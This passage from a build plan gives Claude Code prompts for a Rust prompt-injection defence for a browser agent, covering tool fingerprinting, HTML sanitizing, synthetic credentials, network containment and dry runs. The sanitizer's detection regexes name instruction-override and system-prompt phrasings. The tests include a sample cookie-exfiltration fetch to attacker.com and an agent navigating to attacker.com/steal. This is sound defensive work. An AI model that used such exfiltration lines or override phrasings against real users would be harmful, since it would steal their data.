#[cfg(test)]
mod tests {
    use super::*;
    use ferrite_agent::BrowserTool;

    #[test]
    fn tool_id_from_browser_tool_matches() {
        assert_eq!(ToolId::from(&BrowserTool::ReadPage), ToolId::new("dom.read"));
        assert_eq!(ToolId::from(&BrowserTool::ExecuteJs("".into())), ToolId::new("js.execute"));
        assert_eq!(ToolId::from(&BrowserTool::Navigate("".into())), ToolId::new("navigate"));
    }

    #[test]
    fn fingerprint_contains_checks_both_sets() {
        let mut fp = ToolFingerprint::empty(uuid::Uuid::new_v4(), uuid::Uuid::new_v4());
        fp.must_use.insert(ToolId::new("email.read"));
        fp.may_use.insert(ToolId::new("email.send"));
        assert!(fp.contains(&ToolId::new("email.read")));
        assert!(fp.contains(&ToolId::new("email.send")));
        assert!(!fp.contains(&ToolId::new("passwords.read")));
    }

    #[test]
    fn fingerprint_merge_accumulates() {
        let sid = uuid::Uuid::new_v4();
        let tid = uuid::Uuid::new_v4();
        let mut fp1 = ToolFingerprint::empty(sid, tid);
        fp1.must_use.insert(ToolId::new("email.read"));
        let mut fp2 = ToolFingerprint::empty(sid, tid);
        fp2.may_use.insert(ToolId::new("report.write"));
        fp1.merge(fp2);
        assert!(fp1.must_use.contains(&ToolId::new("email.read")));
        assert!(fp1.may_use.contains(&ToolId::new("report.write")));
    }
}
```
Exit condition: `cargo test -p ferrite-ipi` — all three unit tests pass. `ToolId::from(&BrowserTool::ReadPage)` equals `ToolId::new("dom.read")`.

### Block 2: Rule-based matcher — must-use set from prompt keywords
What it does: Maps common intent keywords in the user prompt to must-use tool sets without involving any model. Covers the ~80% of common tasks where the intent is unambiguous. Returns an empty set for anything it does not recognise — open-ended or unknown prompts get an empty must-use set, which is the safe default.

Prompt for Claude Code:
```
In crates/ferrite-ipi/src/tool_decision/mod.rs add:

/// Maps prompt intent keywords to must-use tool sets.
/// Case-insensitive match on the full prompt string.
/// Returns empty set for unrecognised prompts.
pub fn rule_based_must_use(prompt: &str) -> std::collections::HashSet<ToolId> {
    let lower = prompt.to_lowercase();
    let mut tools = std::collections::HashSet::new();

    // Email tasks
    if lower.contains("email") || lower.contains("inbox") || lower.contains("mail") {
        tools.insert(ToolId::new("email.read"));
    }
    if lower.contains("send email") || lower.contains("reply to") || lower.contains("forward") {
        tools.insert(ToolId::new("email.send"));
    }
    if lower.contains("draft") {
        tools.insert(ToolId::new("email.draft"));
    }

    // Calendar tasks
    if lower.contains("calendar") || lower.contains("schedule") || lower.contains("meeting") {
        tools.insert(ToolId::new("calendar.read"));
    }
    if lower.contains("book") || lower.contains("create event") || lower.contains("add meeting") {
        tools.insert(ToolId::new("calendar.write"));
    }

    // Navigation tasks
    if lower.contains("go to") || lower.contains("navigate to") || lower.contains("open") {
        tools.insert(ToolId::new("navigate"));
    }

    // Form tasks
    if lower.contains("fill") || lower.contains("form") || lower.contains("type in") {
        tools.insert(ToolId::new("form.fill"));
    }
    if lower.contains("submit") || lower.contains("click submit") {
        tools.insert(ToolId::new("form.submit"));
    }

    // Read / extract tasks
    if lower.contains("read") || lower.contains("extract") || lower.contains("find on page")
        || lower.contains("what does") || lower.contains("title of") {
        tools.insert(ToolId::new("dom.read"));
    }

    // Download tasks
    if lower.contains("download") {
        tools.insert(ToolId::new("download.file"));
    }

    // JavaScript tasks
    if lower.contains("javascript") || lower.contains("run script") || lower.contains("execute js") {
        tools.insert(ToolId::new("js.execute"));
    }

    // Report / summarise tasks always need dom.read
    if lower.contains("report") || lower.contains("summarise") || lower.contains("summarize") {
        tools.insert(ToolId::new("dom.read"));
        tools.insert(ToolId::new("report.write"));
    }

    tools
}

#[cfg(test)]
mod rule_tests {
    use super::*;

    #[test]
    fn email_prompt_gives_email_read() {
        let tools = rule_based_must_use("Check my inbox and summarise new emails");
        assert!(tools.contains(&ToolId::new("email.read")));
    }

    #[test]
    fn navigate_prompt_gives_navigate() {
        let tools = rule_based_must_use("Go to https://example.com");
        assert!(tools.contains(&ToolId::new("navigate")));
    }

    #[test]
    fn open_ended_returns_empty() {
        let tools = rule_based_must_use("Do something interesting");
        assert!(tools.is_empty());
    }

    #[test]
    fn no_false_positives_on_unrelated_prompt() {
        let tools = rule_based_must_use("What is the weather today?");
        assert!(!tools.contains(&ToolId::new("email.read")));
        assert!(!tools.contains(&ToolId::new("form.submit")));
    }
}
```
Exit condition: `cargo test -p ferrite-ipi` — all four rule tests pass.

### Block 3: LLM complement layer — may-use set via Gemini at temperature 0
What it does: Sends the user prompt and the tool registry to Gemini at temperature 0 to predict which additional tools the agent might plausibly use beyond the rule-based must-use set. Returns an empty may-use set for open-ended prompts, prompts that produce no parseable tool list, or when the API key is absent. Uses the same `RateLimiter` as the agent backend.

Prompt for Claude Code:
```
Add to crates/ferrite-ipi/Cargo.toml:
[dependencies]
reqwest = { version = "0.12", features = ["json", "rustls-tls"], default-features = false }
tokio = { version = "1", features = ["full"] }

In crates/ferrite-ipi/src/tool_decision/mod.rs add:

use ferrite_agent::RateLimiter;

pub struct LlmMayUsePredictor {
    api_key: String,
    client: reqwest::Client,
    rate_limiter: RateLimiter,
}

impl LlmMayUsePredictor {
    // Returns None if FERRITE_GEMINI_API_KEY is not set.
    // Callers must handle None gracefully (fall back to empty may_use set).
    pub fn from_env() -> Option<Self> {
        let api_key = std::env::var("FERRITE_GEMINI_API_KEY").ok()?;
        Some(Self {
            api_key,
            client: reqwest::Client::new(),
            rate_limiter: RateLimiter::default_testing(),
        })
    }

    // Predicts the may-use set for a given prompt.
    // Temperature 0 — deterministic, minimal hallucination risk.
    // Returns empty set on any error.
    pub async fn predict(&self, prompt: &str, must_use: &std::collections::HashSet<ToolId>)
        -> std::collections::HashSet<ToolId>
    {
        // Build the tool list string (all tools not already in must_use)
        let available: Vec<String> = [
            "email.read", "email.send", "email.draft",
            "calendar.read", "calendar.write", "contacts.read",
            "storage.read", "storage.write",
            "dom.read", "dom.write", "form.fill", "form.submit",
            "network.fetch", "clipboard.read", "clipboard.write",
            "download.file", "navigate", "js.execute",
            "screenshot", "report.write",
        ]
        .iter()
        .filter(|t| !must_use.contains(&ToolId::new(t)))
        .map(|s| s.to_string())
        .collect();

        if available.is_empty() { return Default::default(); }

        let system = "You are a security analysis assistant. Given a user task prompt and a \
                      list of browser tool IDs, respond ONLY with a JSON array of tool ID \
                      strings that the agent might plausibly use to complete the task — \
                      beyond the tools already confirmed. If none are plausible, respond \
                      with an empty array []. Do not explain. Do not add tools the task \
                      clearly does not need. Err on the side of fewer tools.";

        let user_msg = format!(
            "Task: {}\n\nAvailable tools: {}\n\nRespond with a JSON array only.",
            prompt,
            available.join(", ")
        );

        self.rate_limiter.acquire().await;

        let payload = serde_json::json!({
            "system_instruction": { "parts": [{ "text": system }] },
            "contents": [{ "role": "user", "parts": [{ "text": user_msg }] }],
            "generationConfig": { "temperature": 0.0, "maxOutputTokens": 256 }
        });

        let url = format!(
            "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={}",
            self.api_key
        );

        let resp = match tokio::time::timeout(
            std::time::Duration::from_secs(15),
            self.client.post(&url).json(&payload).send()
        ).await {
            Ok(Ok(r)) => r,
            _ => return Default::default(),
        };

        if !resp.status().is_success() { return Default::default(); }

        let body: serde_json::Value = match resp.json().await {
            Ok(b) => b,
            Err(_) => return Default::default(),
        };

        let text = body["candidates"][0]["content"]["parts"][0]["text"]
            .as_str()
            .unwrap_or("");

        // Parse JSON array from response
        let clean = text.trim().trim_start_matches("```json").trim_end_matches("```").trim();
        let ids: Vec<String> = serde_json::from_str(clean).unwrap_or_default();

        ids.into_iter()
           .filter(|id| available.contains(id))
           .map(|id| ToolId::new(&id))
           .collect()
    }
}
```
Exit condition: `cargo build -p ferrite-ipi` compiles. Manual test: `FERRITE_GEMINI_API_KEY=<key>` set, calling `predict("Check my emails and write a summary report", &email_read_set)` returns a set containing `report.write` and not `passwords.read`. CI does not call this function (env var absent → `from_env()` returns None → empty set).

### Block 4: `ToolDecisionEngine` — combining both layers into a single fingerprint
What it does: Composes the rule-based matcher and the LLM complement layer into a single `ToolDecisionEngine`. Exposes a `generate_fingerprint(prompt, task_id)` method that returns a `ToolFingerprint` with both sets populated. Open-ended prompts (empty must-use + empty may-use from LLM) produce an empty fingerprint — IPI skips comparison for these, since any tool is plausible.

Prompt for Claude Code:
```
In crates/ferrite-ipi/src/tool_decision/mod.rs add:

pub struct ToolDecisionEngine {
    predictor: Option<LlmMayUsePredictor>,
}

impl ToolDecisionEngine {
    // Reads API key from env. If absent, LLM layer is disabled — may_use always empty.
    pub fn new() -> Self {
        Self { predictor: LlmMayUsePredictor::from_env() }
    }

    // Generates a ToolFingerprint from a user prompt.
    // Combines rule-based must_use with LLM-predicted may_use.
    // The may_use set never overlaps with must_use.
    pub async fn generate_fingerprint(
        &self,
        prompt: &str,
        task_id: uuid::Uuid,
    ) -> ToolFingerprint {
        let session_id = uuid::Uuid::new_v4();
        let must_use = rule_based_must_use(prompt);

        let may_use = match &self.predictor {
            Some(p) => {
                let raw = p.predict(prompt, &must_use).await;
                // Strip anything already in must_use to keep sets disjoint.
                raw.into_iter().filter(|t| !must_use.contains(t)).collect()
            }
            None => Default::default(),
        };

        ToolFingerprint { session_id, task_id, must_use, may_use }
    }

    // Convenience wrapper for use with a real AgentTask.
    pub async fn fingerprint_from_task(
        &self,
        task: &ferrite_agent::AgentTask,
    ) -> ToolFingerprint {
        self.generate_fingerprint(&task.prompt, task.task_id).await
    }
}

#[cfg(test)]
mod engine_tests {
    use super::*;

    #[tokio::test]
    async fn engine_no_api_key_uses_rules_only() {
        // Temporarily ensure env var is absent for this test.
        std::env::remove_var("FERRITE_GEMINI_API_KEY");
        let engine = ToolDecisionEngine::new();
        let fp = engine.generate_fingerprint(
            "Check my inbox and summarise new emails",
            uuid::Uuid::new_v4(),
        ).await;
        // Rule layer fires for "inbox" / "email"
        assert!(fp.must_use.contains(&ToolId::new("email.read")));
        // may_use is empty because predictor is None
        assert!(fp.may_use.is_empty());
    }

    #[tokio::test]
    async fn engine_open_ended_prompt_produces_empty_fingerprint() {
        std::env::remove_var("FERRITE_GEMINI_API_KEY");
        let engine = ToolDecisionEngine::new();
        let fp = engine.generate_fingerprint(
            "Do something interesting on the web",
            uuid::Uuid::new_v4(),
        ).await;
        assert!(fp.is_empty());
    }

    #[tokio::test]
    async fn must_use_and_may_use_are_disjoint() {
        std::env::remove_var("FERRITE_GEMINI_API_KEY");
        let engine = ToolDecisionEngine::new();
        let fp = engine.generate_fingerprint(
            "Send an email to alice@example.com",
            uuid::Uuid::new_v4(),
        ).await;
        for tool in &fp.may_use {
            assert!(!fp.must_use.contains(tool),
                "Tool {} appears in both sets", tool);
        }
    }
}
```
Exit condition: `cargo test -p ferrite-ipi` — all three engine tests pass. `generate_fingerprint` works with no API key (rules only). must_use and may_use are always disjoint.

## Task 13: IPI — HTML/JS Sanitizer (`ferrite-ipi::sanitizer`)
### Block 1: HTML sanitizer and JS extractor
What it does: Cleans raw HTML received from web pages before it enters the agent context window. Strips all `<script>` tags, event handler attributes (`onclick`, `onload`, etc.), CSS `url()` references that could carry instructions, and HTML comments. Also extracts inline JavaScript for separate analysis. This runs on every page load before the agent sees any content.

Prompt for Claude Code:
```
Add to crates/ferrite-ipi/Cargo.toml:
[dependencies]
ammonia = "3"
regex = "1"

In crates/ferrite-ipi/src/sanitizer/mod.rs implement:

pub struct SanitizedPage {
    /// Clean HTML safe for the agent context window.
    pub clean_html: String,
    /// All JavaScript extracted from <script> tags (for separate analysis).
    pub extracted_scripts: Vec<String>,
    /// SHA-256 hex digest of the original raw HTML.
    pub raw_html_hash: String,
}

/// Sanitises raw HTML and extracts inline scripts.
pub fn sanitize_html(raw_html: &str) -> SanitizedPage {
    use regex::Regex;
    use std::sync::OnceLock;

    // Extract script content before stripping
    static SCRIPT_RE: OnceLock<Regex> = OnceLock::new();
    let script_re = SCRIPT_RE.get_or_init(||
        Regex::new(r"(?si)<script[^>]*>(.*?)</script>").unwrap()
    );
    let extracted_scripts: Vec<String> = script_re
        .captures_iter(raw_html)
        .map(|cap| cap[1].trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();

    // SHA-256 of the raw input for audit / dataset use
    let raw_html_hash = sha256_hex(raw_html.as_bytes());

    // Build ammonia builder with strict allowlist
    let clean_html = ammonia::Builder::default()
        // Allow only safe structural and text tags
        .tags(std::collections::HashSet::from([
            "a", "p", "div", "span", "h1", "h2", "h3", "h4", "h5", "h6",
            "ul", "ol", "li", "table", "thead", "tbody", "tr", "th", "td",
            "strong", "em", "b", "i", "code", "pre", "blockquote",
            "img", "br", "hr",
        ]))
        // Disallow all event handler attributes and javascript: hrefs
        .clean_content_tags(std::collections::HashSet::from(["script", "style", "iframe", "object", "embed"]))
        .url_schemes(std::collections::HashSet::from(["https", "http"]))
        .clean(raw_html)
        .to_string();

    SanitizedPage { clean_html, extracted_scripts, raw_html_hash }
}

/// Checks whether a JavaScript string contains patterns typical of prompt injection.
/// Returns a list of suspicious patterns found (empty = clean).
pub fn detect_js_injection_patterns(js: &str) -> Vec<String> {
    let patterns: &[(&str, &str)] = &[
        (r"(?i)ignore.{0,30}(previous|prior|above)",  "instruction override attempt"),
        (r"(?i)system\s*prompt",                       "system prompt reference"),
        (r"(?i)(exfiltrate|send.{0,20}data|leak)",     "data exfiltration language"),
        (r"(?i)fetch\s*\(",                            "fetch() call"),
        (r"(?i)new\s+WebSocket\s*\(",                  "WebSocket instantiation"),
        (r"(?i)document\.cookie",                      "cookie access"),
        (r"(?i)localStorage|sessionStorage",            "storage access"),
        (r"(?i)navigator\.sendBeacon",                 "sendBeacon call"),
    ];

    let mut found = vec![];
    for (pattern, label) in patterns {
        if regex::Regex::new(pattern)
            .map(|re| re.is_match(js))
            .unwrap_or(false)
        {
            found.push(label.to_string());
        }
    }
    found
}

/// SHA-256 of arbitrary bytes, returned as a hex string.
pub fn sha256_hex(data: &[u8]) -> String {
    // Use a pure-Rust implementation via the sha2 crate.
    use sha2::{Sha256, Digest};
    let hash = Sha256::digest(data);
    hex::encode(hash)
}

// Add to Cargo.toml: sha2 = "0.10", hex = "0.4"

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn strips_script_tags() {
        let html = "<p>Hello</p><script>alert('xss')</script>";
        let result = sanitize_html(html);
        assert!(!result.clean_html.contains("<script"));
        assert!(!result.clean_html.contains("alert"));
        assert!(result.clean_html.contains("Hello"));
    }

    #[test]
    fn extracts_inline_scripts() {
        let html = "<p>x</p><script>var x = 1;</script><script>var y = 2;</script>";
        let result = sanitize_html(html);
        assert_eq!(result.extracted_scripts.len(), 2);
    }

    #[test]
    fn strips_event_handlers() {
        let html = r#"<p onclick="steal()">click me</p>"#;
        let result = sanitize_html(html);
        assert!(!result.clean_html.contains("onclick"));
    }

    #[test]
    fn detects_fetch_in_js() {
        let js = "fetch('https://attacker.com?data='+document.cookie)";
        let patterns = detect_js_injection_patterns(js);
        assert!(!patterns.is_empty());
        assert!(patterns.iter().any(|p| p.contains("fetch")));
    }

    #[test]
    fn clean_js_passes() {
        let js = "const x = document.querySelector('h1').textContent;";
        let patterns = detect_js_injection_patterns(js);
        assert!(patterns.is_empty());
    }
}
```
Add to crates/ferrite-ipi/Cargo.toml:
  ammonia = "3"
  regex = "1"
  sha2 = "0.10"
  hex = "0.4"
Exit condition: `cargo test -p ferrite-ipi` — all five sanitizer tests pass.

## Task 14: IPI — Synthetic Data Twin (`ferrite-ipi::twin`)
### Block 1: `SyntheticTwin` generation, AES-256-GCM encryption, TTL rotation
What it does: Generates a synthetic data twin — a fake but realistic set of user credentials (name, email, password, credit card, phone) that the agent uses during dry runs instead of real credentials. Encrypted at rest with AES-256-GCM. Rotated automatically if the stored twin is older than the TTL. Prevents real credentials from appearing in dry-run network traffic even if exfiltration is attempted.

Prompt for Claude Code:
```
Add to crates/ferrite-ipi/Cargo.toml:
aes-gcm = "0.10"
rand = "0.8"
chrono = { version = "0.4", features = ["serde"] }
serde_json = "1"

In crates/ferrite-ipi/src/twin/mod.rs implement:

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct SyntheticTwin {
    pub name: String,
    pub email: String,
    pub password: String,
    pub phone: String,
    pub credit_card: String,
    pub ssn: String,
    pub address: String,
    pub created_at: chrono::DateTime<chrono::Utc>,
}

impl SyntheticTwin {
    // Generates a new random synthetic twin.
    // All values are plausible but fictitious.
    pub fn generate() -> Self {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let id: u32 = rng.gen_range(1000..9999);
        Self {
            name:        format!("Alex Ferrite-{}", id),
            email:       format!("user{}@ferrite-test.invalid", id),
            password:    format!("Synth!Pass{}#", id),
            phone:       format!("+1-555-{:04}-{:04}", id, rng.gen_range(1000u32..9999u32)),
            credit_card: format!("4000-0000-0000-{:04}", id),
            ssn:         format!("000-00-{:04}", id),
            address:     format!("{} Synthetic Ave, Testville, CA 00000", id),
            created_at:  chrono::Utc::now(),
        }
    }

    // Returns true if the twin is older than ttl_hours.
    pub fn is_expired(&self, ttl_hours: i64) -> bool {
        let age = chrono::Utc::now() - self.created_at;
        age.num_hours() >= ttl_hours
    }
}

// 256-bit key derived from a fixed dev secret. Production would use keyring.
const DEV_KEY: &[u8; 32] = b"ferrite-ipi-twin-dev-key-32byte!";

pub fn encrypt_twin(twin: &SyntheticTwin) -> Result<Vec<u8>, String> {
    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
    use aes_gcm::aead::generic_array::GenericArray;
    use rand::Rng;

    let json = serde_json::to_vec(twin).map_err(|e| e.to_string())?;
    let cipher = Aes256Gcm::new(GenericArray::from_slice(DEV_KEY));
    let nonce_bytes: [u8; 12] = rand::thread_rng().gen();
    let nonce = GenericArray::from_slice(&nonce_bytes);
    let ciphertext = cipher.encrypt(nonce, json.as_ref())
        .map_err(|e| format!("encrypt: {}", e))?;
    // Prepend nonce to ciphertext
    let mut out = nonce_bytes.to_vec();
    out.extend_from_slice(&ciphertext);
    Ok(out)
}

pub fn decrypt_twin(data: &[u8]) -> Result<SyntheticTwin, String> {
    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
    use aes_gcm::aead::generic_array::GenericArray;

    if data.len() < 12 { return Err("data too short".to_string()); }
    let (nonce_bytes, ciphertext) = data.split_at(12);
    let cipher = Aes256Gcm::new(GenericArray::from_slice(DEV_KEY));
    let nonce = GenericArray::from_slice(nonce_bytes);
    let plaintext = cipher.decrypt(nonce, ciphertext)
        .map_err(|e| format!("decrypt: {}", e))?;
    serde_json::from_slice(&plaintext).map_err(|e| e.to_string())
}

// Manages the stored synthetic twin, including TTL rotation.
pub struct TwinManager {
    storage_path: std::path::PathBuf,
    ttl_hours: i64,
}

impl TwinManager {
    pub fn new(storage_path: std::path::PathBuf) -> Self {
        Self { storage_path, ttl_hours: 24 }
    }

    // Loads the stored twin if present and unexpired.
    // Generates and stores a fresh twin otherwise.
    pub fn load_or_generate(&self) -> SyntheticTwin {
        if let Ok(data) = std::fs::read(&self.storage_path) {
            if let Ok(twin) = decrypt_twin(&data) {
                if !twin.is_expired(self.ttl_hours) {
                    return twin;
                }
            }
        }
        let twin = SyntheticTwin::generate();
        if let Ok(enc) = encrypt_twin(&twin) {
            let _ = std::fs::write(&self.storage_path, enc);
        }
        twin
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn twin_generate_produces_unique_values() {
        let t1 = SyntheticTwin::generate();
        let t2 = SyntheticTwin::generate();
        // Email addresses should differ (different random IDs)
        // Not guaranteed but extremely likely
        assert_ne!(t1.email, t2.email);
    }

    #[test]
    fn encrypt_decrypt_roundtrip() {
        let twin = SyntheticTwin::generate();
        let enc = encrypt_twin(&twin).expect("encrypt failed");
        let dec = decrypt_twin(&enc).expect("decrypt failed");
        assert_eq!(dec.email, twin.email);
        assert_eq!(dec.name, twin.name);
    }

    #[test]
    fn twin_not_expired_immediately() {
        let twin = SyntheticTwin::generate();
        assert!(!twin.is_expired(24));
    }

    #[test]
    fn twin_manager_load_or_generate_returns_valid_twin() {
        let path = std::env::temp_dir().join(format!(
            "ferrite-twin-test-{}.enc", uuid::Uuid::new_v4()
        ));
        let mgr = TwinManager::new(path.clone());
        let twin = mgr.load_or_generate();
        assert!(twin.email.contains("ferrite-test.invalid"));
        // Second call loads from disk
        let twin2 = mgr.load_or_generate();
        assert_eq!(twin.email, twin2.email);
        let _ = std::fs::remove_file(path);
    }
}
```
Exit condition: `cargo test -p ferrite-ipi` — all four twin tests pass. Encrypt-decrypt roundtrip succeeds. TwinManager loads the same twin on second call.

## Task 15: IPI — Network Containment (`ferrite-ipi::containment`)
### Block 1: Tokio/hyper interceptor (Option C) + Linux network namespace (Option B)
What it does: Two-layer network containment for the dry run. Option C is a Tokio-level interceptor that activates a shared `ContainmentState` flag; any network call during dry run hits the interceptor and returns a fake response using synthetic twin data instead of completing. Option B creates a Linux network namespace (on Linux only) providing a kernel-level guarantee that no socket can escape. Option C runs on all platforms; Option B is additive on Linux.

Prompt for Claude Code:
```
Add to crates/ferrite-ipi/Cargo.toml:
[dependencies]
url = "2"

[target.'cfg(target_os = "linux")'.dependencies]
nix = { version = "0.28", features = ["net", "user"] }

In crates/ferrite-ipi/src/containment/mod.rs implement:

use std::sync::{Arc, Mutex};
use crate::twin::SyntheticTwin;

#[derive(Debug, Default)]
pub struct ContainmentState {
    pub active: bool,
    pub intercepted_urls: Vec<String>,
}

pub type SharedContainmentState = Arc<Mutex<ContainmentState>>;

// Activates the Option C interceptor.
pub fn activate(state: &SharedContainmentState) {
    let mut s = state.lock().unwrap();
    s.active = true;
    s.intercepted_urls.clear();
    println!("[ferrite-containment] Option C interceptor: ACTIVE");
}

// Deactivates the Option C interceptor.
pub fn deactivate(state: &SharedContainmentState) {
    let mut s = state.lock().unwrap();
    s.active = false;
    println!("[ferrite-containment] Option C interceptor: INACTIVE");
}

// Returns a copy of intercepted URLs and clears the list.
pub fn intercepted_urls(state: &SharedContainmentState) -> Vec<String> {
    let s = state.lock().unwrap();
    s.intercepted_urls.clone()
}

// Called on every outgoing network request during dry run.
// Returns Some(fake_response) if active, None if inactive.
pub fn intercept_request(
    state: &SharedContainmentState,
    url: &str,
    twin: &SyntheticTwin,
) -> Option<String> {
    let mut s = state.lock().unwrap();
    if !s.active { return None; }
    s.intercepted_urls.push(url.to_string());
    Some(format!(
        "{{\"status\": 200, \"body\": \"Intercepted by Ferrite IPI containment. \
         Synthetic identity: {}\"}}",
        twin.name
    ))
}

// Linux-only: creates a network namespace for the dry run context.
#[cfg(target_os = "linux")]
pub fn create_network_namespace() -> Result<(), String> {
    use nix::sched::{unshare, CloneFlags};
    unshare(CloneFlags::CLONE_NEWNET)
        .map_err(|e| format!("failed to create network namespace: {}", e))?;
    println!("[ferrite-containment] Option B namespace: CREATED");
    Ok(())
}

#[cfg(not(target_os = "linux"))]
pub fn create_network_namespace() -> Result<(), String> {
    println!("[ferrite-containment] Option B: not available on this platform");
    Ok(())
}

// Activates both layers: Option C interceptor + Option B namespace on Linux.
pub fn activate_full(state: &SharedContainmentState) -> Result<(), String> {
    activate(state);
    create_network_namespace()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn intercept_returns_none_when_inactive() {
        let state = Arc::new(Mutex::new(ContainmentState::default()));
        let twin = SyntheticTwin::generate();
        assert!(intercept_request(&state, "https://example.com", &twin).is_none());
    }

    #[test]
    fn intercept_returns_fake_response_when_active() {
        let state = Arc::new(Mutex::new(ContainmentState::default()));
        activate(&state);
        let twin = SyntheticTwin::generate();
        let response = intercept_request(&state, "https://attacker.com/steal", &twin);
        assert!(response.is_some());
        let urls = intercepted_urls(&state);
        assert_eq!(urls.len(), 1);
        assert!(urls[0].contains("attacker.com"));
        deactivate(&state);
    }

    #[test]
    fn create_namespace_does_not_panic() {
        // On Linux without CAP_SYS_ADMIN this may return Err — that is expected in CI.
        // The test only verifies no panic occurs.
        let _ = create_network_namespace();
    }
}
```
Exit condition: `cargo test -p ferrite-ipi` — all three containment tests pass.

## Task 16: IPI — Dry Run Orchestrator (`ferrite-ipi::dry_run`)
### Block 1: `DryRunRecord` type, `RecordingExecutor`, and full dry run wired to `AgentRuntime`
What it does: Defines `DryRunRecord` — the accumulator for everything the agent did during the shadow run. Implements `RecordingExecutor`, a `ToolExecutor` that records every tool call and returns synthetic data without touching the real browser. Wires `DryRunOrchestrator::run()` to call the agent via `AgentRuntime`, activate both containment layers, collect the record, and deactivate containment — all in one method.

Prompt for Claude Code:
```
Add to crates/ferrite-ipi/Cargo.toml:
[dependencies]
async-trait = "0.1"
tokio = { version = "1", features = ["full"] }

In crates/ferrite-ipi/src/dry_run/mod.rs implement:

use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use crate::tool_decision::ToolId;
use crate::containment::{SharedContainmentState, ContainmentState, activate_full,
                          deactivate, intercept_request, intercepted_urls};
use crate::twin::{SyntheticTwin, TwinManager};
use ferrite_agent::{AgentRuntime, AgentTask, AgentTurn, AgentToolCall,
                    AgentToolResult, BrowserTool, ToolExecutor};

#[derive(Debug, Default, Clone)]
pub struct DryRunRecord {
    pub session_id: uuid::Uuid,
    pub task_id: uuid::Uuid,
    pub tools_called: HashSet<ToolId>,
    pub origins_touched: HashSet<String>,
    pub data_fields_accessed: HashSet<String>,
    pub network_attempts: Vec<String>,
    pub completed: bool,
}

impl DryRunRecord {
    pub fn new(session_id: uuid::Uuid, task_id: uuid::Uuid) -> Self {
        Self { session_id, task_id, ..Default::default() }
    }
    pub fn record_tool(&mut self, tool: ToolId) { self.tools_called.insert(tool); }
    pub fn record_network_attempt(&mut self, url: String) {
        let origin = extract_origin(&url);
        self.origins_touched.insert(origin);
        self.network_attempts.push(url);
    }
}

fn extract_origin(url: &str) -> String {
    url::Url::parse(url)
        .ok()
        .and_then(|u| {
            let host = u.host_str()?.to_string();
            Some(format!("{}://{}", u.scheme(), host))
        })
        .unwrap_or_else(|| url.to_string())
}

// ToolExecutor that records tool calls and returns synthetic data.
// Never touches the real browser.
struct RecordingExecutor {
    record: Arc<Mutex<DryRunRecord>>,
    twin: SyntheticTwin,
}

#[async_trait::async_trait]
impl ToolExecutor for RecordingExecutor {
    async fn execute(&self, call: &AgentToolCall) -> AgentToolResult {
        let tool_id = ToolId::from(&call.tool);
        {
            let mut rec = self.record.lock().unwrap();
            rec.record_tool(tool_id);
        }
        // Record navigation targets as network attempts
        if let BrowserTool::Navigate(ref url) = call.tool {
            let mut rec = self.record.lock().unwrap();
            rec.record_network_attempt(url.clone());
        }
        // Return synthetic data so the agent can continue reasoning
        let synthetic = match &call.tool {
            BrowserTool::ReadPage => format!("Synthetic page. User: {}", self.twin.name),
            BrowserTool::ExtractData(_) => format!("Extracted: {}", self.twin.email),
            _ => "dry-run: ok".to_string(),
        };
        AgentToolResult::ok(call.call_id, synthetic)
    }
}

pub struct DryRunOrchestrator {
    twin_manager: TwinManager,
    containment: SharedContainmentState,
    timeout_secs: u64,
}

impl DryRunOrchestrator {
    pub fn new(twin_path: std::path::PathBuf) -> Self {
        Self {
            twin_manager: TwinManager::new(twin_path),
            containment: Arc::new(Mutex::new(ContainmentState::default())),
            timeout_secs: 30,
        }
    }

    // Runs a full dry run of the given task using the provided agent backend.
    // Returns the DryRunRecord of everything the agent actually did.
    pub async fn run<R: AgentRuntime>(
        &self,
        task: &AgentTask,
        history: &[AgentTurn],
        agent: &R,
    ) -> Result<DryRunRecord, String> {
        let record = Arc::new(Mutex::new(DryRunRecord::new(task.session_id, task.task_id)));
        let twin = self.twin_manager.load_or_generate();

        // Activate both containment layers
        activate_full(&self.containment).map_err(|e| e)?;

        let executor = RecordingExecutor {
            record: record.clone(),
            twin,
        };

        let turn_result = tokio::time::timeout(
            std::time::Duration::from_secs(self.timeout_secs),
            agent.run_turn(task, history, &executor),
        ).await;

        // Always deactivate containment
        deactivate(&self.containment);

        // Collect any network attempts logged by the containment interceptor
        for url in intercepted_urls(&self.containment) {
            let mut rec = record.lock().unwrap();
            rec.record_network_attempt(url);
        }

        match turn_result {
            Ok(Ok(_turn)) => {
                let mut rec = record.lock().unwrap();
                rec.completed = true;
                Ok(rec.clone())
            }
            Ok(Err(e)) => Err(format!("agent error: {}", e)),
            Err(_) => {
                // Timeout — return partial record with completed = false
                Ok(record.lock().unwrap().clone())
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ferrite_agent::{AgentError, AgentTask};

    struct AlwaysNavigateAgent;

    #[async_trait::async_trait]
    impl AgentRuntime for AlwaysNavigateAgent {
        async fn run_turn(
            &self, _task: &AgentTask, _history: &[AgentTurn], executor: &dyn ToolExecutor,
        ) -> Result<AgentTurn, AgentError> {
            let call = AgentToolCall::new(
                BrowserTool::Navigate("https://attacker.com/steal".to_string())
            );
            executor.execute(&call).await;
            let mut turn = AgentTurn::new();
            turn.tool_calls.push(call);
            turn.final_response = Some("done".to_string());
            turn.is_complete = true;
            Ok(turn)
        }
    }

    #[tokio::test]
    async fn dry_run_records_navigation() {
        let path = std::env::temp_dir().join(
            format!("ferrite-twin-{}.enc", uuid::Uuid::new_v4())
        );
        let orch = DryRunOrchestrator::new(path);
        let task = AgentTask::new("navigate somewhere", None);
        let record = orch.run(&task, &[], &AlwaysNavigateAgent).await.unwrap();
        assert!(record.tools_called.contains(&ToolId::new("navigate")));
        assert!(record.network_attempts.iter().any(|u| u.contains("attacker.com")));
        assert!(record.completed);
    }

    #[tokio::test]
    async fn dry_run_does_not_touch_real_browser() {
        // RecordingExecutor returns synthetic data, never calls into Servo.
        // If this test completes without error, the real browser was not touched.
        let path = std::env::temp_dir().join(
            format!("ferrite-twin-{}.enc", uuid::Uuid::new_v4())
        );
        let orch = DryRunOrchestrator::new(path);
